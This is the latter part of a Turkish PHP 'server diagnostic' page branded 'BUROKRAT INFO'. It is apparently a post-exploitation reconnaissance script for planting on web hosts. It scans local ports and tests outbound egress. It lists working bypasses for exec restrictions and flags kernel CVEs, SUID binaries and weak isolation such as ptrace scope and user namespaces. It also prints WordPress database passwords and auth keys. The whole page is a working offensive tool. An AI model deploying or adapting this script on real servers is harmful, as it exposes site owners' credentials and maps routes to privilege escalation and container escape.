$fs['proc/1/cmdline']=$proc_1_cmdline?'Okunabilir ⚠':'Okunamadı (izole)';

// ── 12. Ağ & Port Taraması ────────────────────────────────
$net=[];
$net['Hostname']=function_exists('gethostname')?(string)gethostname():'N/A';
$net['Timezone']=date_default_timezone_get();
$net['Sunucu Saati']=date('d.m.Y H:i:s');
$net['Kernel']=php_uname('s').' '.php_uname('r');
$net['Mimari']=php_uname('m');
$_osv=php_uname('v');if($_osv)$net['OS Detay']=$_osv;

$_resolv=_fread('/etc/resolv.conf');
$_dns=[];
if($_resolv)preg_match_all('/^nameserver\s+(\S+)/m',$_resolv,$_dm)&&$_dns=$_dm[1];
$net['DNS Sunucuları']=$_dns?implode('  |  ',$_dns):'N/A';

$_cpu=_fread('/proc/cpuinfo');
if($_cpu){
  $cc=substr_count($_cpu,'processor');
  $cm='';if(preg_match('/model name\s*:\s*(.+)/i',$_cpu,$_cma))$cm=trim($_cma[1]);
  $net['CPU']=$cc.' çekirdek'.($cm?' — '.$cm:'');
}

$_mi=_fread('/proc/meminfo');
if($_mi){
  $_mt=$_mf=$_ma=0;
  if(preg_match('/MemTotal:\s+(\d+)/i',$_mi,$_mm))$_mt=(int)$_mm[1];
  if(preg_match('/MemAvailable:\s+(\d+)/i',$_mi,$_mm))$_ma=(int)$_mm[1];
  if($_mt){
    $net['RAM Toplam']=round($_mt/1024).' MB';
    $net['RAM Kullanılan']=round(($_mt-$_ma)/1024).' MB ('.round(($_mt-$_ma)/$_mt*100,1).'%)';
  }
}

if($load_avg)$net['Load Average']=$load_avg;

$_up=_sh('uptime -p');if(!$_up)$_up=_sh('uptime');if($_up)$net['Uptime']=$_up;

// Curl ile localhost port taraması (0.3s timeout)
$ports_scan=[];
if(function_exists('curl_init')){
  $scan_ports=[21=>'FTP',22=>'SSH',80=>'HTTP',443=>'HTTPS',3306=>'MySQL',5432=>'PostgreSQL',
    6379=>'Redis',11211=>'Memcached',8080=>'HTTP-Alt',8443=>'HTTPS-Alt',2222=>'SSH-Alt',
    25=>'SMTP',587=>'SMTP-587',110=>'POP3',143=>'IMAP',8888=>'HTTP-8888',9200=>'Elastic'];
  // curl_multi ile paralel tarama (toplam süre = max 0.3s, serial değil)
  $_mh=curl_multi_init();$_handles=[];
  foreach($scan_ports as $_port=>$_pname){
    $_ch=curl_init();
    curl_setopt_array($_ch,[CURLOPT_URL=>'tcp://127.0.0.1:'.$_port,CURLOPT_CONNECT_ONLY=>true,
      CURLOPT_TIMEOUT_MS=>300,CURLOPT_RETURNTRANSFER=>true,CURLOPT_NOSIGNAL=>true]);
    curl_multi_add_handle($_mh,$_ch);$_handles[$_port]=['ch'=>$_ch,'name'=>$_pname];
  }
  $_active=null;
  do{$_mrc=curl_multi_exec($_mh,$_active);}while($_active&&$_mrc===CURLM_CALL_MULTI_PERFORM);
  usleep(350000); // 350ms bekle — tüm handle'lar için
  do{$_mrc=curl_multi_exec($_mh,$_active);}while($_active&&$_mrc===CURLM_CALL_MULTI_PERFORM);
  foreach($_handles as $_port=>$_ph){
    $_err=curl_errno($_ph['ch']);
    $ports_scan[$_port]=['name'=>$_ph['name'],'open'=>($_err===0||($_err!==7&&$_err!==28&&$_err!==6))];
    curl_multi_remove_handle($_mh,$_ph['ch']);curl_close($_ph['ch']);
  }
  curl_multi_close($_mh);
}

// Dışarıya egress testi
$egress=['enabled'=>false,'ip'=>'','method'=>''];
if(function_exists('curl_init')){
  $_egch=curl_init();
  curl_setopt_array($_egch,[
    CURLOPT_URL=>'https://ifconfig.me/ip',
    CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>4,CURLOPT_NOSIGNAL=>true,
    CURLOPT_USERAGENT=>'Mozilla/5.0',CURLOPT_SSL_VERIFYPEER=>false,
  ]);
  $_egr=@curl_exec($_egch);$_egerr=curl_errno($_egch);curl_close($_egch);
  if(!$_egerr&&$_egr&&preg_match('/^\d{1,3}(\.\d{1,3}){3}$/',trim($_egr))){
    $egress=['enabled'=>true,'ip'=>trim($_egr),'method'=>'curl HTTPS'];
  }
  // HTTP fallback
  if(!$egress['enabled']){
    $_egch2=curl_init();
    curl_setopt_array($_egch2,[CURLOPT_URL=>'http://ifconfig.me/ip',CURLOPT_RETURNTRANSFER=>true,
      CURLOPT_TIMEOUT=>4,CURLOPT_NOSIGNAL=>true,CURLOPT_USERAGENT=>'Mozilla/5.0']);
    $_egr2=@curl_exec($_egch2);$_egerr2=curl_errno($_egch2);curl_close($_egch2);
    if(!$_egerr2&&$_egr2&&preg_match('/^\d{1,3}(\.\d{1,3}){3}$/',trim($_egr2))){
      $egress=['enabled'=>true,'ip'=>trim($_egr2),'method'=>'curl HTTP'];
    }
  }
  // DNS-only test (socket)
  if(!$egress['enabled']&&function_exists('stream_socket_client')){
    $_sock=@stream_socket_client('tcp://8.8.8.8:53',$_se,$_em,2);
    if($_sock){fclose($_sock);$egress=['enabled'=>true,'ip'=>'(DNS bağlantısı açık)','method'=>'socket TCP:53'];}
  }
}

// FPM socket tespiti
$fpm_sockets=[];
$_fpm_dirs=['/var/run','/run','/tmp','/var/run/php','/run/php'];
foreach($_fpm_dirs as $_fd){
  if(@is_dir($_fd)){
    $_fh=@opendir($_fd);
    if($_fh){while(false!==($_ff=@readdir($_fh))){if(substr($_ff,-4)==='.sock'||strpos($_ff,'fpm')!==false)$fpm_sockets[]=$_fd.'/'.$_ff;}@closedir($_fh);}
  }
}

// ── Çıktı ─────────────────────────────────────────────────
while(ob_get_level()>0)ob_end_clean();
header('Content-Type: text/html; charset=utf-8');
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<title>BUROKRAT INFO | <?=_e(isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'Server')?></title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#0ff;font-family:monospace;padding:20px 24px 40px;max-width:980px;margin:0 auto}
h1{color:#0f0;font-size:19px;margin-bottom:3px}
.sub{color:#444;font-size:11px;margin-bottom:14px}
.card{border:1px solid #0f3;border-radius:6px;padding:14px 16px;margin:10px 0;background:#16213e}
h3{color:#0f3;font-size:12px;text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid #0f322}
.srow{display:flex;flex-wrap:wrap;gap:4px 22px;margin:4px 0 8px}
.si{font-size:13px}.si .l{color:#555}.si .v{color:#0ff}.si .v.g{color:#0f0}
.divr{border-top:1px solid #0f322;margin:8px 0}
.row{display:flex;gap:10px;padding:5px 2px;border-bottom:1px solid #0f311;font-size:13px;align-items:baseline}
.row .l{color:#555;min-width:195px;flex-shrink:0;font-size:12px}
.row .v{color:#0ff;word-break:break-all;line-height:1.4}
.row .v.ok{color:#0f0}.row .v.warn{color:#fa0}.row .v.err{color:#f55}.row .v.info{color:#88f}
.bg{display:flex;flex-wrap:wrap;gap:3px}
.b{display:inline-flex;align-items:center;padding:4px 9px;border-radius:3px;font-size:12px;font-family:monospace;cursor:default;white-space:nowrap}
.bon{background:#081808;border:1px solid #0a8;color:#0f0}
.boff{background:#180808;border:1px solid #622;color:#733}
.bna{background:#111;border:1px solid #222;color:#333}
.bwarn{background:#181208;border:1px solid #a60;color:#fa0}
.bdanger{background:#1a0808;border:1px solid #f44;color:#f88}
.bpanel{background:#08081e;border:1px solid #44a;color:#88f}
.binfo{background:#08081e;border:1px solid #226;color:#66a}
.chip{display:inline-block;padding:2px 7px;border-radius:2px;font-size:11px;margin:2px;border:1px solid #1a3a1a;background:#0a1a0a;color:#0a8}
.chip.hl{border-color:#0c0;background:#091909;color:#0f0;font-weight:bold}
.port-grid{display:flex;flex-wrap:wrap;gap:3px;margin-top:8px}
.port{padding:3px 8px;border-radius:2px;font-size:11px;font-family:monospace}
.port.open{background:#081808;border:1px solid #0a8;color:#0f0}
.port.closed{background:#111;border:1px solid #1a1a1a;color:#333}
</style>
</head>
<body>

<h1>BUROKRAT INFO &nbsp;&#124;&nbsp; SERVER DIAGNOSTIC</h1>
<div class="sub"><?=_e($docroot)?> &nbsp;&#124;&nbsp; <?=_e(date('d.m.Y H:i:s'))?></div>

<!-- 1. Özet -->
<div class="card">
  <h3>Sunucu Özeti</h3>
  <div class="srow">
    <div class="si"><span class="l">Server IP: </span><span class="v g"><?=_e($server_ip)?></span></div>
    <div class="si"><span class="l">Your IP: </span><span class="v g"><?=_e($client_ip)?></span></div>
  </div>
  <div class="divr"></div>
  <div class="srow" style="margin-top:8px">
    <div class="si" style="width:100%"><span class="l">Web Server: </span><span class="v"><?=_e($web_server)?></span></div>
    <div class="si" style="width:100%"><span class="l">System: </span><span class="v"><?=_e($uname_full)?></span></div>
    <div class="si"><span class="l">User: </span><span class="v g"><?=_e($cur_user)?></span></div>
    <?php if($uid_raw!==null):?><div class="si"><span class="l">UID/GID: </span><span class="v"><?=_e($uid_raw.'/'.$gid_raw)?></span></div><?php endif;?>
    <?php if($groups_raw):?><div class="si"><span class="l">Groups: </span><span class="v"><?=_e($groups_raw)?></span></div><?php endif;?>
    <div class="si"><span class="l">PHP Version: </span><span class="v g"><?=_e($php_ver)?> &nbsp;<span style="color:#555;font-size:11px">(<?=_e($php_sapi)?>)</span></span></div>
    <?php if($load_avg):?><div class="si"><span class="l">Load: </span><span class="v <?=($load_avg&&(float)explode('/',$load_avg)[0]>4?'warn':'')?>"><?=_e($load_avg)?></span></div><?php endif;?>
  </div>
  <div class="divr"></div>
  <div class="row"><span class="l">Disable Functions</span><span class="v <?=$dis_func==='Yok'?'ok':'warn'?>"><?=_e($dis_func)?></span></div>
</div>

<!-- 2. Hosting Ortamı & Güvenlik -->
<div class="card">
  <h3>Hosting Ortamı &amp; Güvenlik</h3>
  <div class="bg" style="margin-bottom:12px">
<?php
foreach($env as $_en=>$_ev){
  $_state=$_ev[0];$_val=$_ev[1];
  if($_state==='info'){echo '<span class="b binfo">&#9432; '._e($_en).($_val?' <small style="opacity:.7;font-size:10px">'.htmlspecialchars(substr($_val,0,40),ENT_QUOTES,'UTF-8').'</small>':'').'</span>';}
  elseif($_state==='active'||$_state===true){echo '<span class="b bwarn">&#9888; '._e($_en).($_val&&$_val!=='Aktif'?' <small style="opacity:.7;font-size:10px">'.htmlspecialchars(substr($_val,0,30),ENT_QUOTES,'UTF-8').'</small>':'').'</span>';}
  elseif($_state==='warn'){echo '<span class="b bwarn">&#9888; '._e($_en).'</span>';}
  else{echo '<span class="b bna">'._e($_en).'</span>';}
}
?>
  </div>
  <div class="row"><span class="l">open_basedir</span><span class="v <?=(ini_get('open_basedir')?'warn':'ok')?>"><?=_e(ini_get('open_basedir')?:'Kapalı')?></span></div>
  <div class="row"><span class="l">proc/self/environ</span><span class="v <?=$proc_self_environ?'warn':'ok'?>"><?=$proc_self_environ?'Okunabilir ⚠ (hassas)':'Okunamadı'?></span></div>
  <div class="row"><span class="l">proc/1/cmdline (PID1)</span><span class="v <?=$proc_1_cmdline?'warn':'ok'?>"><?=$proc_1_cmdline?'Okunabilir ⚠ (izolasyon zayıf)':'Okunamadı (izole)'?></span></div>
  <div class="row"><span class="l">Virt Tipi</span><span class="v info"><?=_e($virt_type)?></span></div>
</div>

<!-- 3. Exec Bypass Analizi -->
<div class="card">
  <h3>Exec Bypass Analizi</h3>
  <?php
  $_by_yes=[];$_by_partial=[];$_by_no=[];
  foreach($bypass as $_bk=>$_bv){
    if($_bv[0]==='yes')$_by_yes[$_bk]=$_bv[1];
    elseif($_bv[0]==='partial')$_by_partial[$_bk]=$_bv[1];
    else $_by_no[$_bk]=$_bv[1];
  }
  ?>
  <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px">
    <div style="flex:1;min-width:200px">
      <div style="color:#0f0;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px;border-bottom:1px solid #0f322;padding-bottom:3px">✓ ÇALIŞIR (<?=count($_by_yes)?>)</div>
      <?php foreach($_by_yes as $_bk=>$_bd):?>
      <div style="padding:3px 0;border-bottom:1px solid #0a1a0a;font-size:12px">
        <span style="color:#0f0"><?=_e($_bk)?></span>
        <span style="color:#333;font-size:10px;display:block;line-height:1.3;padding-left:4px"><?=_e(substr($_bd,0,70))?></span>
      </div>
      <?php endforeach;?>
    </div>
    <div style="flex:1;min-width:200px">
      <div style="color:#fa0;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px;border-bottom:1px solid #0f322;padding-bottom:3px">~ KOŞULLU (<?=count($_by_partial)?>)</div>
      <?php foreach($_by_partial as $_bk=>$_bd):?>
      <div style="padding:3px 0;border-bottom:1px solid #0a1a0a;font-size:12px">
        <span style="color:#fa0"><?=_e($_bk)?></span>
        <span style="color:#333;font-size:10px;display:block;line-height:1.3;padding-left:4px"><?=_e(substr($_bd,0,70))?></span>
      </div>
      <?php endforeach;?>
    </div>
    <div style="flex:1;min-width:200px">
      <div style="color:#444;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px;border-bottom:1px solid #0f322;padding-bottom:3px">✗ ÇALIŞMAZ (<?=count($_by_no)?>)</div>
      <?php foreach($_by_no as $_bk=>$_bd):?>
      <div style="padding:3px 0;border-bottom:1px solid #0a1a0a;font-size:12px">
        <span style="color:#333"><?=_e($_bk)?></span>
      </div>
      <?php endforeach;?>
    </div>
  </div>
</div>

<!-- 3b. Kernel Güvenlik & SUID -->
<div class="card">
  <h3>Kernel Güvenlik Parametreleri</h3>
<?php foreach($ksec as $_kk=>$_kv):
  $_val=(string)$_kv;
  $_cls='';
  if($_kk==='user_ns (userns_clone)'){$_cls=$_val==='1'?'warn':($_val==='0'?'ok':'info');}
  elseif($_kk==='ptrace_scope'){$_cls=$_val==='0'?'warn':($_val==='1'?'ok':'info');}
  elseif($_kk==='dmesg_restrict'){$_cls=$_val==='0'?'warn':'ok';}
?>
  <div class="row"><span class="l"><?=_e($_kk)?></span><span class="v <?=$_cls?>"><?=_e($_val)?> <?php
    if($_kk==='user_ns (userns_clone)')echo $_val==='1'?'(açık — namespace escape mümkün)':($_val==='0'?'(kapalı — namespace escape BLOKE)':'');
    elseif($_kk==='ptrace_scope')echo $_val==='0'?'(ptrace herkese açık — ⚠)':($_val==='1'?'(sadece child)':($_val==='2'?'(sadece root)':'(tam kısıtlı)'));
    elseif($_kk==='dmesg_restrict')echo $_val==='0'?'(kernel log herkese açık)':'(kısıtlı)';
  ?></span></div>
<?php endforeach;?>
<?php if($kernel_cves):?>
  <div style="margin-top:8px;padding-top:6px;border-top:1px solid #0f322">
    <div style="color:#f55;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px">Potansiyel Kernel CVE'leri (<?=_e($uname_r)?>)</div>
    <?php foreach($kernel_cves as $_cve):?>
    <div class="row"><span class="l" style="color:#f55"><?=_e($_cve['name'])?></span><span class="v warn"><?=_e($_cve['range'])?> — <?=_e($_cve['desc'])?></span></div>
    <?php endforeach;?>
  </div>
<?php else:?>
  <div style="color:#555;font-size:12px;padding:6px 0">Bu kernel versiyonunda eşleşen bilinen CVE yok.</div>
<?php endif;?>
<?php if($suid_found):?>
  <div style="margin-top:8px;padding-top:6px;border-top:1px solid #0f322">
    <div style="color:#fa0;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px">Mevcut SUID Binary'leri</div>
    <?php foreach($suid_found as $_sp=>$_si):$_col=$_si['suid']?'#f88':($ksec?'#fa0':'#0ff');?>
    <div class="row"><span class="l" style="color:<?=$_col?>"><?=_e($_si['name'])?></span><span class="v <?=$_si['suid']?'err':'warn'?>"><?=_e($_sp)?> [<?=_e($_si['perms'])?>]<?=$_si['suid']?' ★SUID':($ksec['suid']??'')?></span></div>
    <?php endforeach;?>
  </div>
<?php else:?>
  <div style="color:#555;font-size:12px;padding:6px 0">Bilinen SUID binary bulunamadı (open_basedir kısıtlı olabilir).</div>
<?php endif;?>
</div>

<!-- 4. Kontrol Paneli -->
<div class="card">
  <h3>Kontrol Paneli Tespiti</h3>
  <div class="bg">
<?php
foreach($panel_map as $_pn=>$_pd){
  if(isset($panels[$_pn])){$_pv=trim($panels[$_pn]);echo '<span class="b bpanel">&#10003; '._e($_pn).($_pv&&$_pv!=='Tespit edildi'?' <small style="opacity:.7;font-size:10px">'.htmlspecialchars(substr($_pv,0,20),ENT_QUOTES,'UTF-8').'</small>':'').'</span>';}
  else{echo '<span class="b bna">'._e($_pn).'</span>';}
}
// Path bazlı ekstralar
foreach($panels as $_pn=>$_pv){
  if(!isset($panel_map[$_pn]))echo '<span class="b bpanel">&#10003; '._e($_pn).' <small style="opacity:.7;font-size:10px">'.htmlspecialchars(substr((string)$_pv,0,25),ENT_QUOTES,'UTF-8').'</small></span>';
}
if(empty($panels))echo '<span style="color:#333;font-size:13px">Hiçbir kontrol paneli tespit edilemedi</span>';
?>
  </div>
</div>

<!-- 5. WordPress -->
<?php if($wp_info):?>
<div class="card">
  <h3>WordPress Tespiti</h3>
<?php foreach($wp_info as $_wk=>$_wv):?>
  <div class="row"><span class="l"><?=_e($_wk)?></span><span class="v <?=in_array($_wk,['DB_PASS','AUTH_KEY'])?'warn':''?>"><?=_e($_wv)?></span></div>
<?php endforeach;?>
</div>
<?php endif;?>

<!-- 6. Servisler -->
<div class="card">
  <h3>Servis Durumu</h3>
  <div class="bg">
<?php foreach($svc as $_sn=>$_sv):
  $_ver=isset($svc_ver[$_sn])&&trim($svc_ver[$_sn])!==''?' <small style="opacity:.6;font-size:10px">'.htmlspecialchars(substr(trim($svc_ver[$_sn]),0,12),ENT_QUOTES,'UTF-8').'</small>':'';
  echo $_sv?'<span class="b bon">ON &nbsp;'._e($_sn).$_ver.'</span>':'<span class="b boff">OFF '._e($_sn).'</span>';
endforeach;?>
  </div>
</div>

<!-- 7. PHP Limitleri -->
<div class="card">
  <h3>PHP Limitleri &amp; Ayarları</h3>
<?php foreach($limits as $_lk=>$_lv):$_warn=(strpos((string)$_lv,'⚠')!==false);?>
  <div class="row"><span class="l"><?=_e($_lk)?></span><span class="v <?=$_warn?'warn':''?>"><?=_e($_lv)?></span></div>
<?php endforeach;?>
</div>

<!-- 8. PHP Eklentileri -->
<div class="card">
  <h3>Yüklü PHP Eklentileri &nbsp;<span style="color:#555;font-size:11px;font-weight:normal;text-transform:none;letter-spacing:0">(<?=count($all_exts)?>)</span></h3>
  <div>
<?php foreach($all_exts as $_ext):$_hl=in_array(strtolower($_ext),$hl_exts);echo '<span class="chip'.($_hl?' hl':'').'">'._e($_ext).'</span>';endforeach;?>
  </div>
</div>

<!-- 9. Cache -->
<div class="card">
  <h3>Cache / Opcode</h3>
  <div class="bg" style="margin-bottom:8px">
<?php foreach($cache as $_cn=>$_cv):
  if($_cv===null)echo '<span class="b bna">'._e($_cn).'</span>';
  elseif($_cv===false)echo '<span class="b boff">OFF '._e($_cn).'</span>';
  else echo '<span class="b bon">ON &nbsp;'._e($_cn).'</span>';
endforeach;?>
  </div>
<?php foreach($cache as $_cn=>$_cv):if($_cv&&$_cv!==true&&$_cv!==false&&$_cv!==null):?>
  <div class="row"><span class="l"><?=_e($_cn)?></span><span class="v ok"><?=_e($_cv)?></span></div>
<?php endif;endforeach;?>
</div>

<!-- 10. Veritabanı -->
<div class="card">
  <h3>Veritabanı Desteği</h3>
  <div class="bg" style="margin-bottom:8px">
<?php foreach($db as $_dn=>$_dv):echo $_dv===false?'<span class="b boff">OFF '._e($_dn).'</span>':'<span class="b bon">ON &nbsp;'._e($_dn).'</span>';endforeach;?>
  </div>
<?php foreach($db as $_dn=>$_dv):if($_dv&&$_dv!==true):?>
  <div class="row"><span class="l"><?=_e($_dn)?></span><span class="v ok"><?=_e($_dv)?></span></div>
<?php endif;endforeach;?>
</div>

<!-- 11. Dosya Sistemi -->
<div class="card">
  <h3>Dosya Sistemi</h3>
<?php foreach($fs as $_fk=>$_fv):
  $_warn=strpos((string)$_fv,'Salt Okunur')!==false||strpos((string)$_fv,'Okunamadı')!==false;
  $_ok=strpos((string)$_fv,'Yazılabilir')!==false||strpos((string)$_fv,'Okunabilir')!==false;
  $_danger=strpos((string)$_fv,'⚠')!==false;?>
  <div class="row"><span class="l"><?=_e($_fk)?></span><span class="v <?=$_danger?'warn':($_ok?'ok':($_warn?'err':''))?>"><?=_e($_fv)?></span></div>
<?php endforeach;?>
</div>

<!-- 12. Ağ & Port Taraması -->
<div class="card">
  <h3>Ağ &amp; Sistem Bilgisi</h3>
  <div class="row"><span class="l">Dışarıya Egress</span><span class="v <?=$egress['enabled']?'warn':'ok'?>"><?=$egress['enabled']?'✓ AKTİF — Dış IP: '._e($egress['ip']).' ('._e($egress['method']).')':'✗ Kapalı (firewall/NAT)'?></span></div>
<?php foreach($net as $_nk=>$_nv):?>
  <div class="row"><span class="l"><?=_e($_nk)?></span><span class="v"><?=_e($_nv)?></span></div>
<?php endforeach;?>
<?php if($ports_scan):?>
  <div style="margin-top:10px;padding-top:8px;border-top:1px solid #0f322">
    <div style="color:#555;font-size:11px;margin-bottom:5px;text-transform:uppercase;letter-spacing:.1em">Localhost Port Taraması</div>
    <div class="port-grid">
<?php foreach($ports_scan as $_port=>$_pi):?>
      <span class="port <?=$_pi['open']?'open':'closed'?>"><?=_e($_port.'/'.$_pi['name'])?></span>
<?php endforeach;?>
    </div>
  </div>
<?php endif;?>
<?php if($fpm_sockets):?>
  <div class="row" style="margin-top:6px"><span class="l">FPM Sockets</span><span class="v warn"><?=_e(implode(', ',$fpm_sockets))?></span></div>
<?php endif;?>
</div>

<div style="position:fixed;bottom:14px;left:16px;font-family:monospace;font-size:11px;color:#333;pointer-events:none;user-select:none;letter-spacing:.04em">created by <span style="color:#555">Bürokrat</span></div>
</body>
</html>
